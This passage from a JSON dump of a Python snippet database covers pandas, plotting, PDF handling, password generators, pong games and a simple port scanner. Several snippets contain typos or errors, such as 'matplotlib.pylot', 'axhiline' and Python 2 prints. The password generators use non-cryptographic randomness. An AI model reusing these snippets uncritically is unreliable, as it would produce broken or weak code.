    "description": "#We calculate and plot the cumulative return of a given dataframe called data r = data.pct_change()   r_plus_one = r.add(1) cumulative_return = r_plus_one.cumprod().sub(1) cumulative_return.mul(100).plot() plt.ylabel('Percent') plt.legend(['Cumulative Return']) plt.show()\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3628,
    "keyword": null,
    "link": null,
    "title": " python pandas dataframe column date to string",
    "description": "all_data['Order Day new'] = all_data['Order Day new'].dt.strftime('%Y-%m-%d') \n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3629,
    "keyword": null,
    "link": null,
    "title": " python pandas difference between two data frames",
    "description": "diff_df = pd.merge(df1, df2, how='outer', indicator='Exist')  diff_df = diff_df.loc[diff_df['Exist'] != 'both']\nsource_df.merge(target_df,how='left',indicator=True).loc[lambda x:x['_merged']!='both']\n# by doing outer, you will get records from both the sides. f = df1.merge(df2,indicator = True, how='outer').loc[lambda x : x['_merge']!='both'] Out[421]:     A  B     _merge 1  2  3  left_only 2  3  4  left_only 3  3  4  left_only  left_unique_result = f.loc[lambda x: x['_merge'] == 'left_only'] right_unique_result = f.loc[lambda x: x['_merge'] == 'right_only']\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3630,
    "keyword": null,
    "link": null,
    "title": " python pandas drop",
    "description": "df = pd.DataFrame(np.arange(12).reshape(3, 4), ...                   columns=['A', 'B', 'C', 'D']) >>> df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  Drop columns >>> df.drop(['B', 'C'], axis=1)    A   D 0  0   3 1  4   7 2  8  11 >>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11\n>>>df = pd.DataFrame(np.arange(12).reshape(3, 4),                       columns=['A', 'B', 'C', 'D']) >>>df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  >>> df.drop(['B', 'C'], axis=1)    A   D 0  0   3 1  4   7 2  8  11  OR  >>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11\ndel df['column_name'] \n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3631,
    "keyword": null,
    "link": null,
    "title": " python pandas drop column by index",
    "description": "df.drop(a_dataframe.columns[0], axis=1, inplace=True)\ndf = pd.DataFrame(np.arange(12).reshape(3, 4), ...                   columns=['A', 'B', 'C', 'D']) >>> df    A  B   C   D 0  0  1   2   3 1  4  5   6   7 2  8  9  10  11  Drop columns >>> df.drop(['B', 'C'], axis=1)    A   D 0  0   3 1  4   7 2  8  11 >>> df.drop(columns=['B', 'C'])    A   D 0  0   3 1  4   7 2  8  11\ndel df['column_name']\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3632,
    "keyword": null,
    "link": null,
    "title": " python pandas remove punctuation",
    "description": "x = pd.DataFrame(dict(column1=[\"Lorum. ipsum.?\"])) x[\"column1\"] = x[\"column1\"].str.replace('[^\\w\\s]','')\n# Define the function to remove the punctuation def remove_punctuations(text):     for punctuation in string.punctuation:         text = text.replace(punctuation, '')     return text # Apply to the DF series df['new_column'] = df['column'].apply(remove_punctuations)\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3633,
    "keyword": null,
    "link": null,
    "title": " python pandas replace nan with null",
    "description": "df.fillna('', inplace=True)\n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3634,
    "keyword": null,
    "link": null,
    "title": " python pandas save df to xlsx file",
    "description": "import pandas as pd # Save Dataframe df to output.xlsx in current directory with sheet_name_1 df.to_excel(\"output.xlsx\", sheet_name='Sheet_name_1') \n",
    "reg_date": "2021-10-12T11:33:46.000Z"
  },
  {
    "id": 3635,
    "keyword": null,
    "link": null,
    "title": " python parallel list comprehension",
    "description": "# Use zip() to generate an single iterable from 2 lists:  zip([1, 2, 3], [\"a\", \"b\", \"c\"]) >> [(1, \"a\"), (2, \"b\"), (3, \"c\")]  example:  xs = [some list] ys = [some other list] func(x,y): return some value  [func(x, y) for x, y in zip(xs, ys)]  will iterate over both lists simultaneously, running func() over each pair of values \n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3636,
    "keyword": null,
    "link": null,
    "title": " python parse args",
    "description": "# parsing arguments with argparse is too easy import argparse  parser = argparse.ArgumentParser(description='Process some integers.') parser.add_argument('integers', metavar='N', type=int, nargs='+',                     help='an integer for the accumulator') parser.add_argument('--sum', dest='accumulate', action='store_const',                     const=sum, default=max,                     help='sum the integers (default: find the max)')  args = parser.parse_args() print(args.accumulate(args.integers))\nimport argparse  parser = argparse.ArgumentParser() parser.add_argument('file', type=argparse.FileType('r')) args = parser.parse_args()  print(args.file.readlines())\nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\",                     default=\"your default value\", help=\"verbose output\")\n# Generic parser function intialization in PYTHON def create_parser(arguments):     \"\"\"Returns an instance of argparse.ArgumentParser\"\"\"     # your code here          parser = argparse.ArgumentParser(         description=\"Description of your code\")     parser.add_argument(\"argument\", help=\"mandatory or positional argument\")     parser.add_argument(\"-o\", \"--optional\",      \thelp=\"Will take an optional argument after the flag\")     namespace = parser.parse_args(arguments)          # Returns a namespace object with your arguments     return namespace \nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\",                     help=\"verbose output\")\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3637,
    "keyword": null,
    "link": null,
    "title": " python parse pdf",
    "description": "import PyPDF2\t\t\t\t\t\t\t\t # Importing required modules pdfFileObj = open('example.pdf', 'rb')       # creating a pdf file object pdfReader = PyPDF2.PdfFileReader(pdfFileObj) # creating a pdf reader object print(pdfReader.numPages)                    # printing number of pages in pdf file pageObj = pdfReader.getPage(0)               # creating a page object print(pageObj.extractText())                 # extracting text from page pdfFileObj.close()                           # closing the pdf file object\npip install pdfminer.six\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3638,
    "keyword": null,
    "link": null,
    "title": " python part of array",
    "description": ">>> a = [1, 2, 3, 4, 5, 6, 7, 8] >>> a[1:4] [2, 3, 4]\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3639,
    "keyword": null,
    "link": null,
    "title": " python password generator",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\n#This is giving you a password with 8 strings and 4 numbers: import random i=0  list=[] while i < 12:     while i < 8:         list.append(random.choice(string.ascii_letters))         i+=1     while i < 12:         list.append(random.randint(0, 9))         i+=1      list=' '.join([str(elem) for elem in list]) print(\"Your new password: \", list.replace(\" \", \"\"))\nimport random import string  x = str(input(\"Do you want a password? y/n \"))  list = [] if x == \"y\":     print(\"Alright!\")     for i in range(16):         _1 = random.choice(string.ascii_letters)         _2 = random.randint(1, 9)         list.append(_1)         list.append(_2) else:     print(\"ok\")   def convert(list):             s = [str(i) for i in list]             res = \"\".join(s)             return(print(res))    convert(list)  \nimport random letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+'] print(\"Welcome to the PyPassword Generator!\") nr_letters = int(input(\"How many letters would you like in your password?\\n\"))  nr_symbols = int(input(f\"How many symbols would you like?\\n\")) nr_numbers = int(input(f\"How many numbers would you like?\\n\")) password_list = [] for char in range(1, nr_letters + 1):   password_list.append(random.choice(letters)) for char in range(1, nr_symbols + 1):   password_list += random.choice(symbols) for char in range(1, nr_numbers + 1):   password_list += random.choice(numbers)  random.shuffle(password_list) password = \"\" for char in password_list:   password += char print(f\"Your password is: {password}\")\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3640,
    "keyword": null,
    "link": null,
    "title": " python pdf merge",
    "description": "# pdf_merging.py  from PyPDF2 import PdfFileReader, PdfFileWriter  def merge_pdfs(paths, output):     pdf_writer = PdfFileWriter()      for path in paths:         pdf_reader = PdfFileReader(path)         for page in range(pdf_reader.getNumPages()):             # Add each page to the writer object             pdf_writer.addPage(pdf_reader.getPage(page))      # Write out the merged PDF     with open(output, 'wb') as out:         pdf_writer.write(out)  if __name__ == '__main__':     paths = ['document1.pdf', 'document2.pdf']     merge_pdfs(paths, output='merged.pdf') \nfrom PyPDF2 import PdfFileMerger, PdfFileReader merger = PdfFileMerger()  merger.append(PdfFileReader(open(filename1, 'rb'))) merger.append(PdfFileReader(open(filename2, 'rb')))  merger.write(\"merged.pdf\")\nfrom PyPDF2 import PdfFileMerger, PdfFileReader   # Call the PdfFileMerger mergedObject = PdfFileMerger()   # I had 116 files in the folder that had to be merged into a single document # Loop through all of them and append their pages for fileNumber in range(1, 117):     mergedObject.append(PdfFileReader('6_yuddhakanda_' + str(fileNumber)+ '.pdf', 'rb'))   # Write all the files into a file which is named as shown below mergedObject.write(\"mergedfilesoutput.pdf\") \n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3641,
    "keyword": null,
    "link": null,
    "title": " python pdf to image",
    "description": "#The pdf2image library can be used #You can install it simply using,  pip install pdf2image #Once installed you can use following code to get images.  from pdf2image import convert_from_path pages = convert_from_path('pdf_file', 500)  #Saving pages in jpeg format  for page in pages:     page.save('out.jpg', 'JPEG')\n# import module from pdf2image import convert_from_path     # Store Pdf with convert_from_path function images = convert_from_path('example.pdf')   for i in range(len(images)):           # Save pages as images in the pdf     images[i].save('page'+ str(i) +'.jpg', 'JPEG') \n#The pdf2image library can be used #You can install it simply using, pip install pdf2image  #Also need to install poppler library using, pip install poppler #Once installed you can use following code to get images.  from pdf2image import convert_from_path pages = convert_from_path('my_pdf_file.pdf', 500)  #Saving pages in png format  for i, page in enumerate(pages): \tpname = 'page' + str(i) + '.png'     page.save(pname, 'PNG')\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3642,
    "keyword": null,
    "link": null,
    "title": " python permute array",
    "description": "# A Python program to print all permutations using library function  from itertools import permutations perm = permutations([1, 2, 3]) for i in list(perm):     print (i) # (1, 2, 3) # (1, 3, 2) # (2, 1, 3) # (2, 3, 1) # (3, 1, 2) # (3, 2, 1)\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3643,
    "keyword": null,
    "link": null,
    "title": " python pi value",
    "description": "#import pi function from math module from math import pi  #Show pi value print(pi)\n# import built in math module import math  # Showing usage of pi function print(math.pi)\n",
    "reg_date": "2021-10-12T11:33:47.000Z"
  },
  {
    "id": 3644,
    "keyword": null,
    "link": null,
    "title": " python pie chart",
    "description": "import matplotlib.pyplot as plt labels = ['Python', 'C++', 'Ruby', 'Java'] sizes = [215, 130, 245, 210] # Plot plt.pie(sizes, labels=labels,          autopct='%1.1f%%', shadow=True, startangle=140) plt.axis('equal') plt.show()\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3645,
    "keyword": null,
    "link": null,
    "title": " python pil get pixel",
    "description": "im = Image.open('image.gif') rgb_im = im.convert('RGB') r, g, b = rgb_im.getpixel((1, 1))  print(r, g, b) >>> (65, 100, 137)\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3646,
    "keyword": null,
    "link": null,
    "title": " python pil resize image",
    "description": "from PIL import Image  # Image.open() can also open other image types img = Image.open(\"some_random_image.jpg\") # WIDTH and HEIGHT are integers resized_img = img.resize((WIDTH, HEIGHT)) resized_img.save(\"resized_image.jpg\")\nfrom PIL import Image # set the base width of the result basewidth = 300 img = Image.open('somepic.jpg') # determining the height ratio wpercent = (basewidth/float(img.size[0])) hsize = int((float(img.size[1])*float(wpercent))) # resize image and save img = img.resize((basewidth,hsize), Image.ANTIALIAS) img.save('sompic.jpg') \nsize = 7016, 4961 im = Image.open(\"my_image.png\") im_resized = im.resize(size, Image.ANTIALIAS) im_resized.save(\"my_image_resized.png\", \"PNG\")\nim = Image.open('image.jpg')   im = im.resize((w, h)) \n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3647,
    "keyword": null,
    "link": null,
    "title": " python ping ip address",
    "description": "import os  ip_list = ['8.8.8.8'] for ip in ip_list:     response = os.popen(f\"ping {ip}\").read()     if \"Received = 4\" in response:         print(f\"UP {ip} Ping Successful\")     else:         print(f\"DOWN {ip} Ping Unsuccessful\")\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3648,
    "keyword": null,
    "link": null,
    "title": " python pip graphviz",
    "description": "pip install graphviz\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3649,
    "keyword": null,
    "link": null,
    "title": " python pip install matplotlib",
    "description": "pip install matplotlib\npip install matplotlib==3.0.3\npip3 install matplotlib\n// install matplotlib  pip install matplotlib  // using conda  conda install -c conda-forge matplotlib \n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3650,
    "keyword": null,
    "link": null,
    "title": " python pip install pandas",
    "description": "pip install pandas\npip install pandas \n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3651,
    "keyword": null,
    "link": null,
    "title": " python pip not working",
    "description": "Correct command: python -m pip install modulename Alternative(if it doesn't work): py.exe -m pip install modulename\nIf youre in windows, try: python -m pip install <lib>\nMake sure pip is added to the PATH variable\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3652,
    "keyword": null,
    "link": null,
    "title": " python pip version check",
    "description": "pip --version\npip show module name\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3653,
    "keyword": null,
    "link": null,
    "title": " python pip yaml",
    "description": "pip install PyYAML\n",
    "reg_date": "2021-10-12T11:33:48.000Z"
  },
  {
    "id": 3654,
    "keyword": null,
    "link": null,
    "title": " python placing numbers between words in order",
    "description": "import sys import numpy as np  array = np.array([]) chars = list() char = '' def strPattern(mystr):     mystr = mystr.upper()     liste =list(mystr)     print(liste)     uzunluk = len(mystr)*2-1     for x in range(0, len(mystr)):         chars.append(liste[x])         if x+1 < len(mystr):             b = str(x+1)             chars.append(b)             str1 = \"\"     print(str1.join(chars)) strPattern('Burkay')\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3655,
    "keyword": null,
    "link": null,
    "title": " python play audio snippet",
    "description": "from playsound import playsound playsound('audio.mp3')\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3656,
    "keyword": null,
    "link": null,
    "title": " python plot bins not lining up with axis",
    "description": "# Basic syntax for left-aligned bins: plt.hist(data, bins=range(number))   # Basic syntax for center-aligned bins: plt.hist(data, bins=np.arange(number)-0.5)\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3657,
    "keyword": null,
    "link": null,
    "title": " python plot cut off when saving",
    "description": "# Error: # After saving your plots, parts of the plot (legend, labels, etc) are # cut off.  # Solution: # Add bbox_inches='tight' plt.savefig('my_figure', bbox_inches='tight')\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3658,
    "keyword": null,
    "link": null,
    "title": " python plot cut off when saving figure",
    "description": "# Error: # After saving your plots, parts of the plot (legend, labels, etc) are # cut off.  # Solution: # Add bbox_inches='tight' plt.savefig('my_figure', bbox_inches='tight')\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3659,
    "keyword": null,
    "link": null,
    "title": " python plot frequency of column values",
    "description": "# Plot frequency my_df['my_var'].value_counts().plot.bar()  # Add column freq to the DF df['freq']=df.groupby(by='Name')['Name'].transform('count')\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3660,
    "keyword": null,
    "link": null,
    "title": " python plot horizontal line",
    "description": "import matplotlib.pyplot as plt plt.axhline(0)\nimport matplotlib.pyplot as plt series.plot(kind='barh') plt.show()\n[ax.axhiline(y=i, linestyle='--') for i in [150,100,200,300]]\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3661,
    "keyword": null,
    "link": null,
    "title": " python plot two lines on same graph",
    "description": "import matplotlib.pylot as plt x_coordinates = [1, 2, 3]  y1_coordinates = [1, 2, 3] y2_coordinates = [3, 4, 5]  fig = plt.figure(1) plt.plot(x_coordinates, y1_coordinates) # plot first line plt.plot(x_coordinates, y2_coordinates) # plot second line plt.show()\n# Short answer: Call plt.plot() as many times as needed to add additional lines to plot.  # Example usage: import matplotlib.pylot as plt x_coordinates = [1, 2, 3]  y1_coordinates = [1, 2, 3] y2_coordinates = [3, 4, 5]  plt.plot(x_coordinates, y1_coordinates) # plot first line plt.plot(x_coordinates, y2_coordinates) # plot second line\n__code-examples__python__python_plot_two_lines_on_same_graph__?\nimport matplotlib.pylot as plt x_coordinates = [1, 2, 3]  y1_coordinates = [1, 2, 3] y2_coordinates = [3, 4, 5]  fig = plt.figure(1) plt.plot(x_coordinates, y1_coordinates) # plot first line plt.plot(x_coordinates, y2_coordinates) # plot second line plt.show()\n# Short answer: Call plt.plot() as many times as needed to add additional lines to plot.  # Example usage: import matplotlib.pylot as plt x_coordinates = [1, 2, 3]  y1_coordinates = [1, 2, 3] y2_coordinates = [3, 4, 5]  plt.plot(x_coordinates, y1_coordinates) # plot first line plt.plot(x_coordinates, y2_coordinates) # plot second line\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3662,
    "keyword": null,
    "link": null,
    "title": " python plotting moving average",
    "description": "#Plot the moving average that is the result of the rolling window r90 = data.rolling(window=90).mean() #<---- Moving Average data.join(r90.add_suffix(' MA 90')).plot(figsize=(8,8)) plt.show()\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3663,
    "keyword": null,
    "link": null,
    "title": " python poner en mayusculas",
    "description": ">>> \"que no grites\".upper() QUE NO GRITES\ntexto_en_mayusculas = \"monty python\".upper() print(texto_en_mayusculas) # imprime: MONTY PYTHON\ncadena = \"este es el texto a modificar\" print(cadena.title()) # imprime: \"Este Es El Texto A Modificar\"\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3664,
    "keyword": null,
    "link": null,
    "title": " python pong game",
    "description": "#The best python pong game without pygame!  import turtle  a_wins = False b_wins = False  # Set up the screen turtle.Screen() wn = turtle.Screen() wn.title(\"Ping Pong game by Timothy\") wn.bgcolor(\"black\") wn.setup(width=800, height=600) wn.tracer(0)  # Score score_a = 0 score_b = 0 score_lim = 10 switch = True  # Paddle A paddle_a = turtle.Turtle() paddle_a.speed(0) paddle_a.color(\"white\") paddle_a.shape(\"square\") paddle_a.penup() paddle_a.goto(-350, 0) paddle_a.shapesize(stretch_wid=5, stretch_len=1)  # Paddle B paddle_b = turtle.Turtle() paddle_b.speed(0) paddle_b.color(\"white\") paddle_b.shape(\"square\") paddle_b.penup() paddle_b.goto(350, 0) paddle_b.shapesize(stretch_wid=5, stretch_len=1)  paddle_a_speed = 20 paddle_b_speed = 20  # Ball ball = turtle.Turtle() ball.speed(0) ball.shape(\"circle\") ball.color(\"white\") ball.penup() ball.goto(0, 0) ball.dy = 0.4 ball.dx = 0.4  # Pen pen = turtle.Turtle() pen.speed(0) pen.penup() pen.color(\"white\") pen.hideturtle() pen.goto(0, 260) pen.write(\"Player A: 0  Player B: 0\", align=\"center\", font=(\"Courier\", 24, \"normal\"))  # Win win = turtle.Turtle() win.speed(0) win.penup() win.color(\"white\") win.hideturtle() win.goto(0, 0)   # Function def paddle_a_up():     y = paddle_a.ycor()     y += paddle_a_speed     paddle_a.sety(y)   def paddle_a_down():     y = paddle_a.ycor()     y -= paddle_a_speed     paddle_a.sety(y)   def paddle_b_up():     y = paddle_b.ycor()     y += paddle_b_speed     paddle_b.sety(y)   def paddle_b_down():     y = paddle_b.ycor()     y -= paddle_b_speed     paddle_b.sety(y)   turtle.listen() turtle.onkey(paddle_a_up, \"w\") turtle.onkey(paddle_a_down, \"s\") turtle.onkey(paddle_b_up, \"Up\") turtle.onkey(paddle_b_down, \"Down\")  # Main game loop while True:     wn.update()      # Move the ball     ball.setx(ball.xcor() + ball.dx)     ball.sety(ball.ycor() + ball.dy)      # Border     if ball.ycor() > 290:         ball.sety(290)         ball.dy *= -1     elif ball.ycor() < -290:         ball.sety(-290)         ball.dy *= -1     elif ball.xcor() > 390:         ball.goto(0, 0)         ball.dx *= -1         score_a += 1     elif ball.xcor() < -390:         ball.goto(0, 0)         ball.dx *= -1         score_b += 1      # Paddle     if 340 < ball.xcor() < 350 and paddle_b.ycor() + 40 > ball.ycor() > paddle_b.ycor() - 40:         ball.setx(340)         ball.dx *= -1     if -340 > ball.xcor() > -350 and paddle_a.ycor() + 40 > ball.ycor() > paddle_a.ycor() - 40:         ball.setx(-340)         ball.dx *= -1      pen.clear()     pen.write(f\"Player A: {score_a}  Player B: {score_b}\", align=\"center\", font=(\"Courier\", 24, \"normal\"))      if score_a == score_lim:         turtle.clearscreen()         a_wins = True         break      elif score_b == score_lim:         turtle.clearscreen()         b_wins = True         break   while True:     if a_wins:         wn.bgcolor(\"black\")         win.write(\"Player A wins\", align=\"center\", font=(\"Courier\", 50, \"normal\"))     elif b_wins:         wn.bgcolor(\"black\")         win.write(\"Player B wins\", align=\"center\", font=(\"Courier\", 50, \"normal\"))\nimport pygame  ### Colors WHITE = (255, 255, 255) BLACK = (0,0,0)  ### Constants W = 600 H = 600 pygame.font.init() comic = pygame.font.SysFont('Comic Sans MS', 30)  ### Variables wt = 10 mplay = False  p1x = W/30 p1y = H/2 - ((W/60)**2)/2  p2x = W-(W/30) p2y = H/2 - ((W/60)**2)/2  p1score = 0 p2score = 0  w_p = False s_p = False wsr = False u_p = False d_p = False udr = False  dm = H/40  paddle_width = W/60 paddle_height = paddle_width**2  bsd = 1  bx = W/2 by = H/2 bw = W/65 bxv = H/60 bxv = -bxv byv = 0  ### Functions def drawpaddle(x, y, w, h):     pygame.draw.rect(screen, WHITE, (x, y, w, h))  def drawball(x, y):     pygame.draw.circle(screen, WHITE, (int(x), int(y)), int(bw))  def uploc():     global p1y     global p2y     if w_p:         if p1y-(dm) < 0:             py1 = 0         else:             p1y -= dm     elif s_p:         if p1y+(dm)+paddle_height > H:             p1y = H-paddle_height         else:             p1y += dm     if u_p:         if p2y-(dm) < 0:             p2y = 0         else:             p2y -= dm     elif d_p:         if p2y+(dm)+paddle_height > H:             p2y = H-paddle_height         else:             p2y += dm  def upblnv():     global bx     global bxv     global by     global byv     global p2score     global p1score      if (bx+bxv < p1x+paddle_width) and ((p1y < by+byv+bw) and (by+byv-bw < p1y+paddle_height)):         bxv = -bxv         byv = ((p1y+(p1y+paddle_height))/2)-by         byv = -byv/((5*bw)/7)     elif bx+bxv < 0:         p2score += 1         bx = W/2         bxv = H/60         by = H/2         byv = 0     if (bx+bxv > p2x) and ((p2y < by+byv+bw) and (by+byv-bw < p2y+paddle_height)):         bxv = -bxv         byv = ((p2y+(p2y+paddle_height))/2)-by         byv = -byv/((5*bw)/7)     elif bx+bxv > W:         p1score += 1         bx = W/2         bxv = -H/60         by = H/2         byv = 0     if by+byv > H or by+byv < 0:         byv = -byv      bx += bxv     by += byv  def drawscore():     score = comic.render(str(p1score) + \" - \" + str(p2score), False, WHITE)     screen.blit(score, (W/2,30))  ### Initialize screen = pygame.display.set_mode((W, H)) pygame.display.set_caption('Snake ML v.1.0.0') screen.fill(BLACK) pygame.display.flip()  running = True while running:     for event in pygame.event.get():         if event.type == pygame.QUIT:             running = False         if event.type == pygame.KEYDOWN:             if event.key == pygame.K_ESCAPE:                 running = False             if event.key == pygame.K_w:                 w_p = True                 if s_p == True:                     s_p = False                     wsr = True             if event.key == pygame.K_s:                 s_p = True                 if w_p == True:                     w_p = False                     wsr = True             if event.key == pygame.K_UP:                 u_p = True                 if d_p == True:                     d_p = False                     udr = True             if event.key == pygame.K_DOWN:                 d_p = True                 if u_p == True:                     u_p = False                     udr = True         if event.type == pygame.KEYUP:             if event.key == pygame.K_w:                 w_p = False                 if wsr == True:                     s_p = True                     wsr = False             if event.key == pygame.K_s:                 s_p = False                 if wsr == True:                     w_p = True                     wsr = False             if event.key == pygame.K_UP:                 u_p = False                 if udr == True:                     d_p = True                     udr = False             if event.key == pygame.K_DOWN:                 d_p = False                 if udr == True:                     u_p = True                     udr = False      screen.fill(BLACK)     uploc()     upblnv()     drawscore()     drawball(bx, by)     drawpaddle(p1x, p1y, paddle_width, paddle_height)     drawpaddle(p2x, p2y, paddle_width, paddle_height)     pygame.display.flip()     pygame.time.wait(wt)\n",
    "reg_date": "2021-10-12T11:33:49.000Z"
  },
  {
    "id": 3665,
    "keyword": null,
    "link": null,
    "title": " python port scanner",
    "description": "import socket, argparse, sys  def Main(ip, port):     print('-' * 120)     print(f'Scanning target: {args.ip}')     print(f'Checking port: {args.port}')     print('-' * 120)      try:         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         s.settimeout(0.5)         result = s.connect_ex((args.ip, args.port))         if result == 0:             print(f'Open Port: {args.port}')         else:             print(f'Port: {args.port} closed')         s.close()     except KeyboardInterrupt:         print('\\nExiting program.')         sys.exit()     except socket.gaierror:         print('Hostname could not be resolved.')         sys.exit()     except socket.timeout:         print('Connection timed out.')         sys.exit()     except socket.error:         print(\"Couldn't connect to server.\")         sys.exit()  if __name__ == \"__main__\":     parser = argparse.ArgumentParser(description='Scan a port on given hostname or ip')     ap = argparse.ArgumentParser(prog='port_scanner.py', usage='%(prog)s [options] -ip \"ip or hostname\" -port \"port to scan\"')     ap.add_argument('-ip', required=True, type=str, help='ip or hostname')     ap.add_argument('-port', required=True, type=int, help='Port to scan')     args = ap.parse_args()     ip = args.ip     port = args.port     Main(ip, port)\n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3666,
    "keyword": null,
    "link": null,
    "title": " python practice questions on classes and objects",
    "description": "kindly refer leetcode\nclass Vehicle:     def __init__(self, max_speed, mileage):         self.max_speed = max_speed         self.mileage = mileage  modelX = Vehicle(240, 18) print(modelX.max_speed, modelX.mileage)\n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3667,
    "keyword": null,
    "link": null,
    "title": " python pressed key",
    "description": "# pip3 install pynput  from pynput.keyboard import Key, Listener   def show(key):      pressed_key = str(key).replace(\"'\", \"\")     print(\" key: \", pressed_key)      if key == Key.esc:         # Stop listener         return False   # Listener with Listener(on_press=show) as listener:     listener.join() \n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3668,
    "keyword": null,
    "link": null,
    "title": " python pretty print",
    "description": ">>> import json >>> print json.dumps({'a':2, 'b':{'x':3, 'y':{'t1': 4, 't2':5}}}, ...                  sort_keys=True, indent=4) {     \"a\": 2,     \"b\": {         \"x\": 3,         \"y\": {             \"t1\": 4,             \"t2\": 5         }     } } \nimport pprint  student_dict = {'Name': 'Tusar', 'Class': 'XII',       'Address': {'FLAT ':1308, 'BLOCK ':'A', 'LANE ':2, 'CITY ': 'HYD'}}  print student_dict print \"\\n\" print \"***With Pretty Print***\" print \"-----------------------\" pprint.pprint(student_dict,width=-1) \n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3669,
    "keyword": null,
    "link": null,
    "title": " python primality test",
    "description": "# Time Efficient Primality Check in Python  def primeCheck(n):     # 0, 1, even numbers greater than 2 are NOT PRIME     if n==1 or n==0 or (n % 2 == 0 and n > 2):         return \"Not prime\"     else:         # Not prime if divisable by another number less         # or equal to the square root of itself.         # n**(1/2) returns square root of n         for i in range(3, int(n**(1/2))+1, 2):             if n%i == 0:                 return \"Not prime\"         return \"Prime\"\n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3670,
    "keyword": null,
    "link": null,
    "title": " python primera letra mayuscula",
    "description": "cadena = \"este es el texto a modificar\" print(cadena.title()) # imprime: \"Este Es El Texto A Modificar\"\ntexto_en_mayusculas = \"monty python\".upper() print(texto_en_mayusculas) # imprime: MONTY PYTHON\n",
    "reg_date": "2021-10-12T11:33:50.000Z"
  },
  {
    "id": 3671,
    "keyword": null,
    "link": null,
    "title": " python print",
